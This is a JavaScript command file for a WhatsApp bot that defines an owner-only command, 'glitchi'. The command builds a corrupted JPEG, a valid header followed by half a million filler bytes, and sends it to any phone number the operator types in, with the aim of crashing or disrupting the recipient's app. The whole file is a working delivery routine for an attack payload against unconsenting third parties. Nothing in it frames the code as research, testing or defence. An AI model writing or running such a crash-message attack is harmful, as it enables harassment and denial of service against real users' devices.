// commands/glitchi.js
import fs from "fs";
import path from "path";
import { botOwnerNumbers } from "../settings.js"; // Make sure your owner numbers are here

export default {
  name: "glitchi",
  description: "Send a fake image crash (OWNER ONLY)",
  category: "owner",
  async execute(m, { args, sendReply, sock }) {
    try {
      // Check if sender is owner
      if (!botOwnerNumbers.includes(m.sender.split("@")[0])) {
        return sendReply("❌ Owner only command.");
      }

      // Validate phone number
      if (!args[0]) {
        return sendReply("📌 Usage: .glitchi <phone_number>");
      }
      const targetNumber = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      // Create corrupted image buffer
      const corruptedData = Buffer.from("\xff\xd8\xff\xe0" + "A".repeat(500000), "binary"); // Fake oversized header

      // Save temporarily
      const tempPath = path.join(process.cwd(), "temp_glitch.jpg");
      fs.writeFileSync(tempPath, corruptedData);

      // Send the fake image
      await sock.sendMessage(targetNumber, {
        image: fs.readFileSync(tempPath),
        caption: "💥 Glitch Test Image",
      });

      // Delete temp file
      fs.unlinkSync(tempPath);

      sendReply(`✅ Glitch image sent to ${args[0]}`);
    } catch (err) {
      console.error(err);
      sendReply("❌ Failed to send glitch image.");
    }
  },
};
